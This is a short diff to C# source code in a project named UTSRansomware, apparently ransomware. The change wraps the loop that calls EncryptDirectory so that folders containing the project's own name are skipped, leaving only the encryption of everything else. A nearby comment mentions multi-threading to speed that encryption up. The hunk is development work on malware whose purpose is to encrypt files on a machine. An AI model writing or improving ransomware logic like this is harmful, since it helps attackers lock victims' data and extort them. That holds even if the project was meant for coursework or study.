@@ -67,7 +67,10 @@ namespace UTSRansomware
 
             foreach (string directoryPath in directoryPaths)
             {
-                EncryptDirectory(directoryPath);
+                if (!directoryPath.Contains("UTSRansomware"))
+                {
+                    EncryptDirectory(directoryPath);
+                }
             }
 
             // Using multi threaded processing to try improve speed
